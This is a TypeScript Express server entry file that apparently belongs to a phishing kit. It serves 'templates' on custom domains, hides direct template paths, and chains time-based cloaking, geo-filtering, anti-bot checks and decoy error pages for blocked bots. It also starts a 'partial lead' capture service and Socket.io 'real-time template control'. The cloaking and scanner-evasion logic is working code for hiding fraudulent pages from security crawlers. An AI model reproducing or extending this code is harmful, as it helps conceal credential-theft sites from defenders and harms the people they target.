import 'dotenv/config'; // Load environment variables first
import express from 'express';
import { createServer } from 'http';

// Extend Express Request interface to include template info
declare global {
  namespace Express {
    interface Request {
      templateInfo?: {
        templateName: string;
        domainName: string;
        isCustomDomain: boolean;
      };
    }
  }
}
import jwt from 'jsonwebtoken';
import bcrypt from 'bcryptjs';
import { config } from './config';
import { setupRoutes } from './routes';
import { setupMiddleware } from './middleware';
import { initDatabase } from './database';
import socketManager from './services/socketManager';
import { antiBot } from './middleware/antiBot';
import { timeBasedCloaking } from './middleware/cloaking';
import { geoFilter } from './middleware/geoFilter';
import notificationService from './services/notificationService';
import partialLeadService from './services/partialLeadService';
import path from 'path';

// Initialize express application
const app = express();
const httpServer = createServer(app);
const PORT = process.env.PORT || 3001;

// Configure Express to trust proxy headers in production
if (config.server.trustProxy) {
  console.log('🔧 Configuring Express to trust proxy headers');
  app.set('trust proxy', true);
}

// STEP 1: Domain URL rewriting AND validation BEFORE anti-bot
// This allows anti-bot to see the rewritten URL and apply correct rules
app.use(async (req, res, next) => {
  // Skip API routes, static assets, and admin routes
  if (req.path.startsWith('/api/') || 
      req.path.startsWith('/admin') || 
      req.path.startsWith('/login') ||
      req.path.match(/\.(js|css|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf|eot)$/)) {
    return next();
  }
  
  // Check for X-Original-Host header first (from reverse proxy), then fall back to Host header
  const originalHost = req.get('x-original-host');
  const hostname = (originalHost || req.get('host') || '').split(':')[0];
  console.log(`🔍 [DOMAIN-REWRITE] Processing: ${hostname}${req.path}${originalHost ? ' (from X-Original-Host)' : ''}`);
  
  // Skip localhost
  if (!hostname || hostname.includes('localhost') || hostname.includes('127.0.0.1')) {
    return next();
  }
  
  // Check if this is a custom domain in database
  try {
    const { getDb } = require('./database');
    const db = getDb();
    
    console.log(`🔍 [DOMAIN-REWRITE] ====== START DOMAIN LOOKUP ======`);
    console.log(`🔍 [DOMAIN-REWRITE] Hostname: ${hostname}`);
    console.log(`🔍 [DOMAIN-REWRITE] Full URL: ${req.get('host')}${req.path}`);
    console.log(`🔍 [DOMAIN-REWRITE] Headers:`, JSON.stringify(req.headers, null, 2));
    
    const domain = db.prepare('SELECT d.*, t.folder_name FROM domains d JOIN templates t ON d.template_id = t.id WHERE d.domain_name = ? AND d.is_active = 1').get(hostname);
    
    console.log(`🔍 [DOMAIN-REWRITE] Query result:`, domain ? `Found ${JSON.stringify(domain)}` : 'No domain found');
    console.log(`🔍 [DOMAIN-REWRITE] ====== END DOMAIN LOOKUP ======`);
    
    if (domain) {
      console.log(`🔍 [DOMAIN-REWRITE] Custom domain found: ${hostname} → template: ${domain.folder_name}`);
      
      if (req.path === '/') {
        // Root path - serve React app and let it handle template routing
        console.log(`🔄 [DOMAIN-REWRITE] ${hostname}/ → serving React app for template: ${domain.folder_name}`);
        
        // Add template info to request for React app
        req.templateInfo = {
          templateName: domain.folder_name,
          domainName: hostname,
          isCustomDomain: true
        };
        
        // Continue to serve React app (don't rewrite URL)
      } else {
        // Non-root path on custom domain - BLOCK ALL TEMPLATE PATHS
        const requestedTemplate = req.path.substring(1).split('/')[0]; // Extract template from path
        
        // Check if this is any template path
        try {
          const templates = db.prepare('SELECT folder_name FROM templates').all() as Array<{folder_name: string}>;
          const isAnyTemplate = templates.some(t => t.folder_name === requestedTemplate);
          
          if (isAnyTemplate) {
            // ANY direct template path access on custom domain - BLOCK
            console.log(`🚫 [DOMAIN-REWRITE] Direct template path blocked: ${hostname}${req.path} (templates only accessible via root domain)`);
            const { generateFallbackErrorPage } = require('./utils/errorPageSelector');
            return res.status(403).send(generateFallbackErrorPage());
          } else {
            // Non-template path (like /assets, /api) - allow
            console.log(`✅ [DOMAIN-REWRITE] Non-template path allowed: ${hostname}${req.path}`);
          }
        } catch (error) {
          console.error(`❌ [DOMAIN-REWRITE] Error checking templates:`, error);
          // On error, block to be safe
          const { generateFallbackErrorPage } = require('./utils/errorPageSelector');
          return res.status(403).send(generateFallbackErrorPage());
        }
      }
    } else {
      console.log(`🔍 [DOMAIN-REWRITE] No custom domain found for: ${hostname}`);
    }
  } catch (error) {
    console.error(`❌ [DOMAIN-REWRITE] Database error for ${hostname}:`, error);
    // If error, continue normally
  }
  
  console.log(`🔄 [DOMAIN-REWRITE] Continuing to next middleware for: ${hostname}${req.path}`);
  next();
});

// Apply anti-detection middleware AFTER domain rewriting
// This prevents processing potentially malicious payloads

// 1. Time-based cloaking (if enabled)
if (config.antiBot?.scheduledCloaking) {
  console.log(`🌙 Time-based cloaking enabled (Hours: ${config.antiBot.scheduledHours})`);
  app.use((req, res, next) => {
    timeBasedCloaking(req, res, next).catch(next);
  });
}

// 2. Geo-filtering (if enabled)
if (config.antiBot?.geoFiltering) {
  console.log(`🌍 Geo-filtering enabled (Countries: ${config.antiBot.allowedCountries.join(', ')})`);
  app.use((req, res, next) => {
    geoFilter(req, res, next).catch(next);
  });
}

// 3. Anti-bot detection
if (config.antiBot?.enabled) {
  console.log(`🛡️ Anti-bot protection enabled (Threshold: ${config.antiBot.headerThreshold})`);
  app.use((req, res, next) => {
    antiBot(req, res, next).catch(next);
  });
}

// Error page routes (decoy sites for blocked bots)
app.get('/portfolio*', (req, res) => {
  const { getRandomErrorPagePath } = require('./utils/errorPageSelector');
  res.sendFile(getRandomErrorPagePath());
});

// Set up middleware AFTER security checks
app.use(express.json());
setupMiddleware(app);

// Initialize database
initDatabase();

// Initialize Socket.io and attach to Express app
socketManager.init(httpServer, app);

// Set up routes
setupRoutes(app);

// Start server
httpServer.listen(PORT, async () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Socket.io enabled for real-time template control`);
  
  // Send system startup notification
  setTimeout(async () => {
    try {
      await notificationService.notifySystemStartup();
      console.log('📢 System startup notification sent');
    } catch (error) {
      console.error('Error sending startup notification:', error);
    }
  }, 2000); // Wait 2 seconds for system to fully initialize
  
  // Start partial lead processing service
  setTimeout(() => {
    try {
      partialLeadService.startBackgroundProcessing();
      console.log('🔄 Partial lead service started');
    } catch (error) {
      console.error('Error starting partial lead service:', error);
    }
  }, 5000); // Wait 5 seconds for full system initialization
});

export default app;
